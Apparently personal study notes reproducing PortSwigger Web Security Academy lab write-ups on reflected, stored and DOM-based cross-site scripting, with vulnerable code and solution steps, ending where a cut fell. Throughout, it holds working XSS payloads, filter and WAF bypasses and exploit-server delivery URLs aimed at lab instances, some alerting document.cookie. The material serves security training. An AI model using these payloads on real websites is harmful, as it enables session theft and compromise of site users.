## Cross-site scripting

There are three main types of XSS attacks. These are:        

- [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected), where the malicious script comes from the current HTTP request, arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.                
- [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored), where the malicious script comes from the website's database, arises when an application receives data from an untrusted source and  includes that data within its later HTTP responses in an unsafe way.                   
- [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based), where the vulnerability exists in client-side code rather than server-side code, arises when an application contains some client-side JavaScript that  processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM.        

Reference

https://portswigger.net/web-security/cross-site-scripting

https://portswigger.net/web-security/cross-site-scripting/contexts

https://portswigger.net/web-security/cross-site-scripting/exploiting

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox

https://portswigger.net/web-security/cross-site-scripting/content-security-policy

https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup



### Cross-site scripting contexts

#### **XSS with HTML tags**

##### Reflected XSS into HTML context with nothing encoded

> This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.
>
> To solve the lab, perform a cross-site scripting attack that calls the alert function.

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        <p>
                            Copy and paste the following into the search box:
                        </p>
                        <code class="code-scrollable">&lt;script&gt;alert(1)&lt;/script&gt;</code>
                    </li>
                    <li>
                        Click "Search".
                    </li>
                </ol>
            </div>
        </div>



##### Stored XSS into HTML context with nothing encoded

> This lab contains a stored cross-site scripting vulnerability in the comment functionality.        
>
> To solve this lab, submit a comment that calls the `alert` function when the blog post is viewed.

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        <p>
                            Enter the following into the comment box:
                        </p>
                        <code class="code-scrollable">&lt;script&gt;alert(1)&lt;/script&gt;</code>
                    </li>
                    <li>
                        Enter a name, email and website.
                    </li>
                    <li>
                        Click "Post comment".
                    </li>
                    <li>
                        Go back to the blog.
                    </li>
                </ol>
            </div>
        </div>



##### Reflected XSS into HTML context with most tags and attributes blocked

> This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.
>
> To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function. 
>

<div class="component-solution is-expandable expanded">
            <h5>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h5>
            <div>
                <ol>
                    <li>
                        <p>
                            Inject a standard XSS vector, such as:
                        </p>
                        <code class="code-scrollable">&lt;img src=1 onerror=print()&gt;</code>
                    </li>
                    <li>
                        Observe that this gets blocked. In the next few steps, we'll use use Burp Intruder to test which tags and attributes are being blocked.
                    </li>
                    <li>
                        Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.
                    </li>
                    <li>
                        In Burp Intruder, in the Positions tab, click "Clear §". Replace the value of the search term with: <code>&lt;&gt;</code>
                    </li>
                    <li>
                        Place the cursor between the angle brackets and click "Add §" twice, to create a payload position. The value of the search term should now look like: <code>&lt;§§&gt;</code>
                    </li>
                    <li>
                        Visit the XSS cheat sheet and click "Copy tags to clipboard".
                    </li>
                    <li>
                        In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list. Click "Start attack".
                    </li>
                    <li>
                        When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the <code>body</code> payload, which caused a 200 response.
                    </li>
                    <li>
                        <p>
                            Go back to the Positions tab in Burp Intruder and replace your search term with:
                        </p>
                        <code class="code-scrollable">&lt;body%20=1&gt;</code>
                    </li>
                    <li>
                        Place the cursor before the <code>=</code> character and click "Add §" twice, to create a payload position. The value of the search term should now look like: <code>&lt;body%20§§=1&gt;</code>
                    </li>
                    <li>
                        Visit the XSS cheat sheet and click "copy events to clipboard".
                    </li>
                    <li>
                        In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list. Click "Start attack".
                    </li>
                    <li>
                        When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the <code>onresize</code> payload, which caused a 200 response.
                    </li>
                    <li>
                        <p>
                            Go to the exploit server and paste the following code, replacing <code>your-lab-id</code> with your lab ID:
                        </p>
                        <code class="code-scrollable">&lt;iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'&gt;</code>
                    </li>
                    <li>
                        Click "Store" and "Deliver exploit to victim".
                    </li>
                </ol>
            </div>
        </div>




##### Reflected XSS into HTML context with all tags blocked except custom ones

> This lab blocks all HTML tags except custom ones.
>
> To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts `document.cookie`.
>

<div class="component-solution is-expandable">
            <h5>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h5>
            <div>
                <ol>
                    <li>
                        <p>
                            Go to the exploit server and paste the following code, replacing <code>your-lab-id</code> with your lab ID:
                        </p>
                            <code class="code-scrollable">&lt;script&gt;
location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
&lt;/script&gt;</code>
                    </li>
                    <li>
                        Click "Store" and "Deliver exploit to victim".
                    </li>
                </ol>
                <p>
                    This injection creates a custom tag with the ID <code>x</code>, which contains an <code>onfocus</code> event handler that triggers the <code>alert</code> function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the <code>alert</code> payload to be called.
                </p>
            </div>
        </div>



##### Reflected XSS into attribute with angle brackets HTML-encoded

> This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function. 

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
                    </li>
                    <li>
                        Observe that the random string has been reflected inside a quoted attribute.
                    </li>
                    <li>
                        <p>
                            Replace your input with the following payload to escape the quoted attribute and inject an event handler:
                        </p>
                        <code class="code-scrollable">"onmouseover="alert(1)</code>
                    </li>
                    <li>
                        Verify the technique worked by right-clicking, selecting "Copy URL", and pasting the URL in the browser. When you move the mouse over the injected element it should trigger an alert.
                    </li>
                </ol>
            </div>
        </div>



##### Stored XSS into anchor href attribute with double quotes HTML-encoded

> This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.        

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Post a comment with a random alphanumeric string in the "Website" input, then use Burp Suite to intercept the request and send it to Burp Repeater.
                    </li>
                    <li>
                        Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.
                    </li>
                    <li>
                        Observe that the random string in the second Repeater tab has been reflected inside an anchor <code>href</code> attribute.
                    </li>
                    <li>
                        <p>
                        Repeat the process again but this time replace your input with the following payload to inject a JavaScript URL that calls alert:
                        </p>
                        <code class="code-scrollable">javascript:alert(1)</code>
                    </li>
                    <li>
                        Verify the technique worked by right-clicking, selecting "Copy URL", and pasting the URL in the browser. Clicking the name above your comment should trigger an alert.
                    </li>
                </ol>
            </div>
        </div>



##### Reflected XSS with some SVG markup allowed

> This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.
>
> To solve the lab, perform a cross-site scripting attack that calls the alert() function.

<div class="component-solution is-expandable">
            <h5>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h5>
            <div>
                <ol>
                    <li>
                        <p>
                            Inject a standard XSS payload, such as:
                        </p>
                        <code class="code-scrollable">&lt;img src=1 onerror=alert(1)&gt;</code>
                    </li>
                    <li>
                        Observe that this payload gets blocked. In the next few steps, we'll use Burp Intruder to test which tags and attributes are being blocked.
                    </li>
                    <li>
                        Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.
                    </li>
                    <li>
                        In Burp Intruder, in the Positions tab, click "Clear §".
                    </li>
                    <li>
                        In the request template, replace the value of the search term with: <code>&lt;&gt;</code>
                    </li>
                    <li>
                        Place the cursor between the angle brackets and click "Add §" twice to create a payload position. The value of the search term should now be: <code>&lt;§§&gt;</code>
                    </li>
                    <li>
                        Visit the XSS cheat sheet and click "Copy tags to clipboard".
                    </li>
                    <li>
                        In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list. Click "Start attack".
                    </li>
                    <li>
                        When the attack is finished, review the results. Observe that all payloads caused an HTTP 400 response, except for the ones using the <code>&lt;svg&gt;</code>, <code>&lt;animatetransform&gt;</code>, <code>&lt;title&gt;</code>, and <code>&lt;image&gt;</code> tags, which received a 200 response.
                    </li>
                    <li>
                        <p>
                            Go back to the Positions tab in Burp Intruder and replace your search term with:
                        </p>
                        <code class="code-scrollable">&lt;svg&gt;&lt;animatetransform%20=1&gt;</code>
                    </li>
                    <li>
                        <p>
                            Place the cursor before the <code>=</code> character and click "Add §" twice to create a payload position. The value of the search term should now be:
                        </p>
                        <code class="code-scrollable">&lt;svg&gt;&lt;animatetransform%20§§=1&gt;</code>
                    </li>
                    <li>
                        Visit the XSS cheat sheet and click "Copy events to clipboard".
                    </li>
                    <li>
                        In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list. Click "Start attack".
                    </li>
                    <li>
                        <p>
                            When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the <code>onbegin</code> payload, which caused a 200 response.
                        </p>
                        <p>
                            Visit the following URL in the browser to confirm that the alert() function is called and the lab is solved:
                        </p>
                        <code class="code-scrollable">https://your-lab-id.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E</code>
                    </li>
                </ol>
            </div>
        </div>



##### Reflected XSS in canonical link tag

> This lab reflects user input in a canonical link tag and escapes angle brackets.
>
> To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.
>
> To assist with your exploit, you can assume that the simulated user will press the following key combinations:
>
>     ALT+SHIFT+X,  CTRL+ALT+X,  Alt+X
>    
>    Please note that the intended solution to this lab is only possible in Chrome. 

<div class="component-solution is-expandable expanded">
            <h5>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h5>
            <div>
                <ol>
                    <li>
                        <p>
                            Visit the following URL, replacing <code>your-lab-id</code> with your lab ID:
                        </p>
                        <code class="code-scrollable">https://your-lab-id.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)</code>
                        <p>
                            This sets the <code>X</code> key as an access key for the whole page. When a user presses the access key, the <code>alert</code> function is called.
                        </p>
                    </li>
                    <li>
                        To trigger the exploit on yourself, press one of the following key combinations:
                        <ul>
                            <li>
                                On Windows: <code>ALT+SHIFT+X</code>
                            </li>
                            <li>
                                On MacOS: <code>CTRL+ALT+X</code>
                            </li>
                            <li>
                                On Linux: <code>Alt+X</code>
                            </li>
                        </ul>
                    </li>
                </ol>
            </div>
        </div>


##### Reflected XSS with event handlers and href attributes blocked

> This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked..
>
> To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function.
>
> Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example: `<a href="">Click me</a>`
>

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <p>
                    Visit the following URL, replacing <code>your-lab-id</code> with your lab ID:
                </p>
                    <code class="code-scrollable">https://your-lab-id.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E</code>
            </div>
        </div>

Other way

```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>

<!-- from xss-cheat-->
<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
```

#### **XSS into JavaScript** 

##### Reflected XSS into a JavaScript string with angle brackets HTML encoded

> This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle  brackets are encoded. The reflection occurs inside a JavaScript string.  To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.  

Vulnerable code

```html
<div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href="/">Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <h1>0 search results for '8808'</h1>
                        <hr>
                    </section>
                    <section class="search">
                        <form action="/" method="GET">
                            <input type="text" placeholder="Search the blog..." name="search">
                            <button type="submit" class="button">Search</button>
                        </form>
                    </section>
                    <script>
                        var searchTerms = 'Your input !!!';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script><img src="/resources/images/tracker.gif?searchTerms=8808">
                    <section class="blog-list">
                        <div class="is-linkback">
                            <a href="/">Back to Blog</a>
                        </div>
                    </section>
                </div>
```

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
                    </li>
                    <li>
                        Observe that the random string has been reflected inside a JavaScript string.
                    </li>
                    <li>
                        <p>
                            Replace your input with the following payload to break out of the JavaScript string and inject an alert:
                        </p>
                        <code class="code-scrollable">'-alert(1)-'</code>
                    </li>
                    <li>
                        Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert.
                    </li>
                </ol>
            </div>
        </div>



##### Reflected XSS into a JavaScript string with single quote and backslash escaped

> This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.
>
> To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. 

Other way

```
</script><img src=1 onerror=alert()>
```

```html
<script>var searchTerms = '</script>
<img src="1" onerror="alert()">
';document.write('
<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">
');
```

<div class="component-solution is-expandable expanded">
            <h5>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h5>
            <div>
                <ol>
                    <li>
                        Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
                    </li>
                    <li>
                        Observe that the random string has been reflected inside a JavaScript string.
                    </li>
                    <li>
                        Try sending the payload <code>test'payload</code> and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.
                    </li>
                    <li>
                        <p>
                            Replace your input with the following payload to break out of the script block and inject a new script:
                        </p>
                        <code class="code-scrollable">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>
                    </li>
                    <li>
                        Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert.
                    </li>
                </ol>
            </div>
        </div>


##### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

> This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.
>
> To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. 

<div class="component-solution is-expandable expanded">
            <h5>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h5>
            <div>
                <ol>
                    <li>
                        Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
                    </li>
                    <li>
                        Observe that the random string has been reflected inside a JavaScript string.
                    </li>
                    <li>
                        Try sending the payload <code>test'payload</code> and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.
                    </li>
                    <li>
                        Try sending the payload <code>test\payload</code> and observe that your backslash doesn't get escaped.
                    </li>
                    <li>
                        <p>
                            Replace your input with the following payload to break out of the JavaScript string and inject an alert:
                        </p>
                        <code class="code-scrollable">\'-alert(1)//</code>, which gets converted to: <code class="code-scrollable">\\'-alert(document.domain)//</code>. The first backslash means that the second backslash is interpreted literally, and not as a special character. This means that the quote is now interpreted as a string terminator.
                    </li>
                    <li>
                        Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert.
                    </li>
                </ol>
            </div>
        </div>


##### Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

> This lab contains a stored cross-site scripting vulnerability in the comment functionality.
>
> To solve this lab, submit a comment that calls the alert function when the comment author name is clicked. 

Vulnerable code

```html
<section class="comment">
<p><img src="/resources/images/avatarDefault.svg" class="avatar">
<a id="author" href="http://testurl" onclick="var tracker={track(){}};tracker.track('http://testurl');">123</a></p>
<p>1231</p><p></p>
</section>
```

Other way

```html
<!-- payload: http://test/&apos;+alert())// -->
<!-- payload: http://test/&apos;);alert()// -->
<section class="comment">
<p><img src="/resources/images/avatarDefault.svg" class="avatar"><a id="author" href="http://test/'+alert())//" onclick="var tracker={track(){}};tracker.track('http://test/'+alert())//');">1</a></p>
<p>1</p><p></p>
</section>
```

<div class="component-solution is-expandable expanded">
            <h5>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h5>
            <div>
                <ol>
                    <li>
                        Post a comment with a random alphanumeric string in the "Website" input, then use Burp Suite to intercept the request and send it to Burp Repeater.
                    </li>
                    <li>
                        Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.
                    </li>
                    <li>
                        Observe that the random string in the second Repeater tab has been reflected inside an <code>onclick</code> event handler attribute.
                    </li>
                    <li>
                        <p>
                            Repeat the process again but this time modify your input to inject a JavaScript URL that calls <code>alert</code>, using the following payload:
                        </p>
                        <code class="code-scrollable">http://foo?&amp;apos;-alert(1)-&amp;apos;</code>
                        <p>The &amp;apos; sequence is an HTML entity representing an apostrophe or single quote. Because the browser HTML-decodes the value of the onclick attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters.</p>
                    </li>
                    <li>
                        Verify the technique worked by right-clicking, selecting "Copy URL", and pasting the URL in the browser. Clicking the name above your comment should trigger an alert.
                    </li>
                </ol>
            </div>
        </div>


##### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

> This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the alert function inside the template string.

Vulnerable code

```html
<section class="blog-header">
<h1 id="searchMessage">0 search results for '"/&gt;&lt;script&gt;alert()&lt;/script&gt;'</h1>
<script>
var message = `0 search results for '\u0022/\u003e\u003cscript\u003ealert()\u003c/script\u003e'`;
document.getElementById('searchMessage').innerText = message;
</script><hr>
</section>
```

<div class="component-solution is-expandable expanded">
            <h5>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h5>
            <div>
                <ol>
                    <li>
                        Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
                    </li>
                    <li>
                        Observe that the random string has been reflected inside a JavaScript template string.
                    </li>
                    <li>
                        Replace your input with the following payload to execute JavaScript inside the template string: <code>${alert(1)}</code>
                        <p>JavaScript template literals are string literals that allow embedded JavaScript expressions. The embedded expressions are evaluated and are normally concatenated into the surrounding text. Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the ${...} syntax. </p>
                    </li>
                    <li>
                        Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert.
                    </li>
                </ol>
            </div>
        </div>


##### Reflected XSS in a JavaScript URL with some characters blocked

> This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.
>
> To solve the lab, perform a cross-site scripting attack that calls the alert function with the string 1337 contained somewhere in the alert message. 

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <p>
                    Visit the following URL, replacing <code>your-lab-id</code> with your lab ID:
                </p>
                    <code class="code-scrollable">https://your-lab-id.web-security-academy.net/post?postId=5&amp;%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27</code>
                <p>
                    The lab will be solved, but the alert will only be called if you click "Back to blog" at the bottom of the page.
                </p>
                <p>
                    The exploit uses exception handling to call the <code>alert</code> function with arguments. The <code>throw</code> statement is used, separated with a blank comment in order to get round the no spaces restriction. The <code>alert</code> function is assigned to the <code>onerror</code> exception handler.
                </p>
                <p>
                    As <code>throw</code> is a statement, it cannot be used as an expression. Instead, we need to use arrow functions to create a block so that the <code>throw</code> statement can be used. We then need to call this function, so we assign it to the <code>toString</code> property of <code>window</code> and trigger this by forcing a string conversion on <code>window</code>.
                </p>
            </div>
        </div>

```html
<!--payload: &'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:' -->

<!--result-->
<div class="is-linkback">
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4%26%27},x%3dx%3d%3e{throw/**/onerror%3dalert,1337},toString%3dx,window+%27%27,{x%3a%27'}).finally(_ => window.location = '/')">Back to Blog</a>
</div>

<!--decode-->
<div class="is-linkback">
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=4&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window '',{x:''}).finally(_ => window.location = '/')">Back to Blog</a>
</div>
```



### **DOM XSS**

#### DOM XSS in document.write sink using source location.search

> This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.
>
> To solve this lab, perform a cross-site scripting attack that calls the alert function

Vulnerable code

```javascript
<script>
function trackSearch(query) {
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {trackSearch(query);}
</script>
```

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Enter a random alphanumeric string into the search box.
                    </li>
                    <li>
                        Right-click and inspect the element, and observe that your random string has been placed inside an <code>img src</code> attribute.
                    </li>
                    <li>
                        <p>
                            Break out of the <code>img</code> attribute by searching for:
                        </p>
                        <code class="code-scrollable">"&gt;&lt;svg onload=alert(1)&gt;</code>
                    </li>
                </ol>
            </div>
        </div>



#### DOM XSS in innerHTML sink using source location.search

> This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.        
>
> To solve this lab, perform a cross-site scripting attack that calls the `alert` function.        

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        <p>
                            Enter the following into the into the search box:
                        </p>
                        <code class="code-scrollable">&lt;img src=1 onerror=alert(1)&gt;</code>
                    </li>
                    <li>
                        Click "Search".
                    </li>
                </ol>
                <p>
                    The value of the <code>src</code> attribute is invalid and throws an error. This triggers the <code>onerror</code> event handler, which then calls the <code>alert()</code> function. As a result, the payload is executed whenever the user's browser attempts to load the page containing your malicious post.
                </p>
            </div>
        </div>



#### DOM XSS in jQuery anchor href attribute sink using location.search source

> This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.
>
> To solve this lab, make the "back" link alert document.cookie. 

Vulnerable code

```html
<div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href="/">Home</a><p>|</p>
                            <a href="/feedback?returnPath=/feedback">Submit feedback</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Submit feedback</h1>
                    <form id="feedbackForm" action="/feedback/submit" method="POST" enctype="application/x-www-form-urlencoded">
                        <input required="" type="hidden" name="csrf" value="OZwo7LuyrLTIa1nr15TGHnYxy8SnaE9k">
                        <label>Name:</label>
                        <input required="" type="text" name="name">
                        <label>Email:</label>
                        <input required="" type="email" name="email">
                        <label>Subject:</label>
                        <input required="" type="text" name="subject">
                        <label>Message:</label>
                        <textarea required="" rows="12" cols="300" name="message"></textarea>
                        <button class="button" type="submit">
                            Submit feedback
                        </button>
                        <span id="feedbackResult"></span>
                        <script src="/resources/js/jquery_1-8-2.js"></script>
                        <div class="is-linkback">
                            <a id="backLink" href="/">Back</a>
                        </div>
                        <script>
                            $(function() {
                                $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
                            });
                        </script>
                    </form>
                    <script src="/resources/js/submitFeedback.js"></script>
                    <br>
                </div>
```

submitFeedback.js

```javascript
document.getElementById("feedbackForm").addEventListener("submit", function(e) {
    submitFeedback(this.getAttribute("method"), this.getAttribute("action"), this.getAttribute("enctype"), this.getAttribute("personal"), new FormData(this));
    e.preventDefault();
});

function submitFeedback(method, path, encoding, personal, data) {
    var XHR = new XMLHttpRequest();
    XHR.open(method, path);
    if (personal) {
        XHR.addEventListener("load", displayFeedbackMessage(data.get('name')));
    } else {
        XHR.addEventListener("load", displayFeedbackMessage());
    }
    if (encoding === "multipart/form-data") {
        XHR.send(data)
    } else {
        var params = new URLSearchParams(data);
        XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        XHR.send(params.toString())
    }
}

function displayFeedbackMessage(name) {
    return function() {
        var feedbackResult = document.getElementById("feedbackResult");
        if (this.status === 200) {
            feedbackResult.innerHTML = "Thank you for submitting feedback" + (name ? ", " + name : "") + "!";
            feedbackForm.reset();
        } else {
            feedbackResult.innerHTML =  "Failed to submit feedback: " + this.responseText
        }
    }
}
```

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        On the Submit feedback page, change the query parameter <code>returnPath</code> to <code>/</code> followed by a random alphanumeric string.
                    </li>
                    <li>
                        Right-click and inspect the element, and observe that your random string has been placed inside an a <code>href</code> attribute.
                    </li>
                    <li>
                        <p>
                            Change <code>returnPath</code> to:
                        </p>
                        <code class="code-scrollable">javascript:alert(document.cookie)</code>
                        <p>
                            Hit enter and click "back".
                        </p>
                    </li>
                </ol>
            </div>
        </div>



#### DOM XSS in jQuery selector sink using a hashchange event

> This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.        
>
> To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.        

Vulnerable code

```html
